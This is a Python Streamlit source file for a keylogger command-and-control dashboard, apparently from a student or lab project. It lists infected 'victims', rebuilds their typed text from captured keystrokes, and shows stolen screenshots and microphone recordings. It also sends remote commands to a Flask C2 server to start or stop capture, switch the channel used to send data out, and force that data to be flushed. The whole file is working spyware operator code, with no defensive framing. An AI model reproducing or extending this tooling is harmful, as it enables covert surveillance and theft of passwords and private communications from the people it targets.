# Libraries for creating the web application and handling data
import streamlit as st
import os
import json
import pandas as pd 
import time
from datetime import datetime
import base64  # Used for decoding Base64 strings (images, audio)
import io      # Used for in-memory handling of audio data
import requests # Used for sending C2 commands

# --- CONFIGURATION ---
st.set_page_config(
    page_title="Keylogger C&C Dashboard",
    page_icon="🕵️‍♂️",
    layout="wide", # Use the full width of the screen
    initial_sidebar_state="expanded"
)

# Path to the storage directory (relative to the 'controller/' folder)
STORAGE_DIR = "../attaquant/stockage/"
# Endpoint for C2 commands (Must match the Flask server's IP and port)
C2_COMMAND_ENDPOINT = "http://127.0.0.1:5000/command" 

# --- UTILITY FUNCTIONS ---

def get_victims():
    """Retrieves the list of victim folders (identified by their unique ID)."""
    if not os.path.exists(STORAGE_DIR):
        os.makedirs(STORAGE_DIR, exist_ok=True)
        return []
        
    # List only directories inside the storage path
    victims = [d for d in os.listdir(STORAGE_DIR) if os.path.isdir(os.path.join(STORAGE_DIR, d))]
    return sorted(victims)

@st.cache_data(show_spinner="Loading and processing logs...")
def load_logs(victim_id):
    """
    Reads the events.jsonl file, extracts and flattens all events,
    handles mixed schemas, and returns a Pandas DataFrame.
    """
    path = os.path.join(STORAGE_DIR, victim_id, "events.jsonl")
    
    if not os.path.exists(path):
        return pd.DataFrame()

    all_events = []
    try:
        with open(path, "r", encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    try:
                        log_entry = json.loads(line)
                        
                        if "events" in log_entry and isinstance(log_entry["events"], list):
                            all_events.extend(log_entry["events"])
                            
                    except json.JSONDecodeError:
                        continue 
    except Exception as e:
        st.error(f"Error reading log file: {e}")
        return pd.DataFrame()

    if not all_events:
        return pd.DataFrame()

    df = pd.DataFrame(all_events)
    
    if 'type' not in df.columns:
        df['type'] = 'keyboard'
        
    # 3. Timestamp Processing
    if 'timestamp' in df.columns:
        # Renamed 'Heure' to 'Time' in the resulting DataFrame
        df['Time'] = pd.to_datetime(df['timestamp'], unit='s', errors='coerce')
        df = df.drop(columns=['timestamp'])
    
    # 4. Keyboard Event Processing
    if 'key' in df.columns:
        df['key'] = df['key'].fillna('') 
        # Renamed 'Touche' to 'Key_Press' in the resulting DataFrame
        df['Key_Press'] = df['key'].apply(lambda x: 
                                             '' if x == '' else
                                             'space' if x == ' ' else
                                             'enter' if x == 'Key.enter' else
                                             'backspace' if x == 'Key.backspace' else
                                             'NULL/Mouse' if x is None else
                                             x.replace('Key.', '').replace('\\u0013', 'CTRL+S')
                                            )
        df = df.drop(columns=['key'])
        
    if 'Key_Press' not in df.columns:
         df['Key_Press'] = ''

    # Reorganize columns for readability
    cols = ['Time', 'type', 'Key_Press']
    for col in ['duration', 'rate', 'channels', 'format']:
        if col in df.columns:
            cols.append(col)
            
    cols.extend([col for col in df.columns if col not in cols])
    df = df[cols].drop_duplicates()
    
    # Remove the large Base64 'data' field from non-media events
    df['data'] = df.apply(lambda row: row['data'] if row['type'] in ['audio', 'screenshot'] else None, axis=1)

    return df

def pcm16_to_wav_bytes(pcm_base64, sample_rate=44100, channels=1):
    """Decodes Base64 PCM audio data and adds a full WAV header."""
    try:
        sample_rate = int(sample_rate)
        channels = int(channels)
    except (TypeError, ValueError):
        return None
        
    try:
        pcm_data = base64.b64decode(pcm_base64)
    except Exception:
        return None

    data_size = len(pcm_data)
    bits_per_sample = 16
    byte_rate = sample_rate * channels * 2
    block_align = channels * 2

    wav_header = io.BytesIO()

    # RIFF chunk
    wav_header.write(b'RIFF')
    wav_header.write((36 + data_size).to_bytes(4, 'little')) 
    wav_header.write(b'WAVE')

    # fmt sub-chunk
    wav_header.write(b'fmt ')
    wav_header.write((16).to_bytes(4, 'little'))  
    wav_header.write((1).to_bytes(2, 'little'))  
    wav_header.write(channels.to_bytes(2, 'little'))  
    wav_header.write(sample_rate.to_bytes(4, 'little'))  
    wav_header.write(byte_rate.to_bytes(4, 'little'))  
    wav_header.write(block_align.to_bytes(2, 'little'))  
    wav_header.write(bits_per_sample.to_bytes(2, 'little'))  

    # data sub-chunk
    wav_header.write(b'data')
    wav_header.write(data_size.to_bytes(4, 'little')) 

    return wav_header.getvalue() + pcm_data

def reconstruct_text(df):
    """
    Iterates through the DataFrame and reconstructs the typed text, handling backspace,
    space, and Enter keys.
    """
    if df.empty or 'Key_Press' not in df.columns:
        return "No keystrokes to analyze."

    df_keyboard = df[df['type'] == 'keyboard'].copy()
    current_text = []
    
    for index, row in df_keyboard.iterrows():
        key = row['Key_Press']
        
        if key == '':
            continue
            
        if len(key) == 1 and key.isprintable():
            current_text.append(key)
        
        elif key == 'space':
            current_text.append(' ')
            
        elif key == 'enter':
            current_text.append('\n[ENTER]\n')
            
        elif key == 'backspace':
            if current_text:
                current_text.pop() 
        
        elif key in ['ctrl_l', 'cmd', 'shift', 'alt', 'up', 'down', 'left', 'right', 'tab', 'NULL/Mouse']:
            pass
        
        else:
            if key not in ['delete', 'caps_lock', 'scroll_lock', 'num_lock', 'insert']:
                current_text.append(f"[{key.upper()}]") 

    return "".join(current_text)

def send_c2_command(victim_id, action, mode_value=None):
    """Sends a command to the C2 server endpoint for the given victim."""
    global C2_COMMAND_ENDPOINT
    
    # Build the full command string for switch_mode
    full_action = f"{action}:{mode_value}" if action == "switch_mode" and mode_value else action
    
    payload = {
        "victim_id": victim_id,
        "action": full_action
    }
    
    try:
        r = requests.post(C2_COMMAND_ENDPOINT, json=payload, timeout=5)
        if r.status_code == 200:
            st.success(f"✅ Command '{full_action}' sent to C2 queue for {victim_id}.")
        else:
            st.error(f"❌ Error sending command (HTTP {r.status_code}).")
    except Exception as e:
        st.error(f"❌ Failed to connect to C2 server (command): Check URL and server status.")

# --- GRAPHICAL INTERFACE ---

# 1. Sidebar
with st.sidebar:
    st.header("🎮 Control Center")
    st.divider()
    
    # Manual Refresh Button
    if st.button("🔄 Refresh Logs and Victim List"):
        st.cache_data.clear()
        st.rerun()

    victims = get_victims()
    
    if not victims:
        st.warning("No victims detected.")
        selected_victim = None
    else:
        st.success(f"✅ {len(victims)} Active Victim(s)")
        selected_victim = st.selectbox("Select a Target:", victims)
        
    st.divider()
    st.info(f"Storage Directory: \n`{os.path.abspath(STORAGE_DIR)}`")
    
    # --- C2 COMMAND SECTION ---
    st.header("📡 Remote C2 Commands")
    if selected_victim:
        st.markdown(f"**Selected Target:** `{selected_victim}`")
        
        # 1. Capture Commands
        st.subheader("Capture Control")
        col_start, col_stop = st.columns(2)
        with col_start:
            if st.button("▶️ Start Capture", use_container_width=True):
                send_c2_command(selected_victim, "start_capture")
        with col_stop:
            if st.button("⏸️ Stop Capture", use_container_width=True):
                send_c2_command(selected_victim, "stop_capture")
                
        # 2. Mode Switch Command
        st.subheader("Communication Mode")
        mode = st.selectbox("New Comm. Mode:", ["http", "tcp"])
        if st.button("🔄 Switch Mode", use_container_width=True):
            send_c2_command(selected_victim, "switch_mode", mode)
            
        # 3. Flush Logs Command
        st.subheader("Log Management")
        if st.button("🧹 Flush Logs Now", help="Forces immediate exfiltration of all buffered logs.", use_container_width=True):
            send_c2_command(selected_victim, "flush_logs")

    else:
        st.warning("Select a victim to send commands.")


# 2. Main Area
st.title("🕵️‍♂️ C2 Monitoring Dashboard")

if selected_victim:
    # --- Live Mode Configuration ---
    col_header, col_toggle = st.columns([0.8, 0.2])
    with col_header:
        st.subheader(f"Logs for: **{selected_victim}**")
    with col_toggle:
        live_mode = st.toggle("🔴 LIVE MODE", value=False)

    # --- Loading and Metrics ---
    df = load_logs(selected_victim)

    if df.empty:
        st.info("The log file is currently empty or unreadable.")
    else:
        # Filter DataFrames by type
        df_keyboard = df[df['type'] == 'keyboard'].copy()
        df_audio = df[df['type'] == 'audio'].copy()
        df_screenshot = df[df['type'] == 'screenshot'].copy()
        
        # Quick Metrics
        m1, m2, m3, m4 = st.columns(4)
        m1.metric("Total Events", len(df))
        m2.metric("Keystrokes", len(df_keyboard))
        m3.metric("Audio Clips", len(df_audio))
        m4.metric("Screen Captures", len(df_screenshot))
        
        last_activity = "N/A"
        if 'Time' in df.columns and not df.empty:
            last_activity = df['Time'].iloc[-1].strftime("%Y-%m-%d %H:%M:%S")
        
        m5 = st.columns(5)[4] 
        m5.metric("Last Activity", last_activity)
        
        st.divider()

        # --- TEXT RECONSTRUCTION ---
        st.header("📝 Reconstructed Text")
        
        reconstructed_output = reconstruct_text(df_keyboard)

        st.text_area(
            "Reconstructed Text Output: (Use CTRL+A to select all)",
            reconstructed_output,
            height=300
        )
        
        st.divider()
        
        # --- SCREENSHOT EVENTS ---
        st.header("📸 Screen Captures")
        
        if not df_screenshot.empty:
            st.subheader(f"Total: {len(df_screenshot)} captures")
            
            cols = st.columns(3) 
            
            for i, row in df_screenshot.iterrows():
                col = cols[i % 3] 
                
                with col:
                    if 'data' in row and row['data']:
                        try:
                            img_bytes = base64.b64decode(row['data'])
                            st.image(img_bytes, caption=row['Time'].strftime('%H:%M:%S'), use_column_width=True)
                        except Exception as e:
                            st.warning(f"Image decoding error at {row['Time'].strftime('%H:%M:%S')}")
        else:
            st.info("No screen captures recorded.")
            
        st.divider()

        # --- AUDIO EVENTS ---
        st.header("🎧 Captured Audio Events")
        
        if not df_audio.empty:
            st.subheader(f"Total: {len(df_audio)} audio clips")
            
            for index, row in df_audio.iterrows():
                
                if 'data' not in row or not row['data']:
                    continue
                
                st.markdown(f"**Audio Clip #{index+1}**: Captured at **{row['Time'].strftime('%H:%M:%S')}**")
                
                col_info, col_player = st.columns([0.4, 0.6])
                
                with col_info:
                    st.write(f"Duration: **{row['duration']:.2f} seconds**")  
                    st.write(f"Sampling Rate: **{int(row.get('rate', 44100))} Hz**")
                
                with col_player:
                    wav_bytes = pcm16_to_wav_bytes(
                        row['data'], 
                        sample_rate=row.get('rate', 44100), 
                        channels=row.get('channels', 1) 
                    )
                    
                    if wav_bytes:
                        st.audio(wav_bytes, format='audio/wav')
                    else:
                        st.error("Decoding error or unsupported audio format.")
                st.divider()  
                
        else:
            st.info("No audio events captured.")
            
        st.divider()
        
        # --- Graphical Visualizations ---
        st.header("📈 Keystroke Analysis")
        col_visu1, col_visu2 = st.columns(2)

        if 'Time' in df_keyboard.columns and 'Key_Press' in df_keyboard.columns and not df_keyboard.empty:
            
            with col_visu1:
                st.subheader("Keyboard Activity by Period (10s)")
                df_time = df_keyboard.set_index('Time').resample('10S').size().reset_index(name='Events')
                st.line_chart(df_time, x='Time', y='Events')

            with col_visu2:
                st.subheader("Top 10 Frequent Keys (Characters)")
                keys_to_exclude = ['NULL/Mouse', 'ctrl_l', 'cmd', 'shift', 'alt', 'tab', 'backspace', 'enter', 'space']
                common_keys_df = df_keyboard[~df_keyboard['Key_Press'].isin(keys_to_exclude)]
                
                top_keys = common_keys_df['Key_Press'].value_counts().nlargest(10).reset_index()
                top_keys.columns = ['Key', 'Frequency']
                
                st.bar_chart(top_keys, x='Key', y='Frequency')

        st.divider()

        # --- Raw Detailed Logs Table ---
        st.write("### 📜 Raw Detailed History (All Event Types)")
        
        df_display = df.drop(columns=['data'], errors='ignore')
        
        st.dataframe(
            df_display, 
            use_container_width=True, 
            height=300,
            hide_index=True
        )

        # Download Button
        csv = df_display.to_csv(index=False).encode('utf-8')
        st.download_button(
            label="📥 Download Complete Logs (CSV)",
            data=csv,
            file_name=f'logs_{selected_victim}_{datetime.now().strftime("%Y%m%d")}.csv',
            mime='text/csv',
        )

    # LIVE Mode Logic (Auto-refresh)
    if live_mode:
        time.sleep(2) 
        st.cache_data.clear() 
        st.rerun()  

else:
    # Default view if no victim is selected
    st.write("### Welcome to the Management Interface.")
    st.info("Launch your Flask server and the keylogger to generate files in the storage folder.")
    
    if victims:
        st.write("#### Available Victim Files:")
        for v in victims:
            st.text(f"📂 {v}")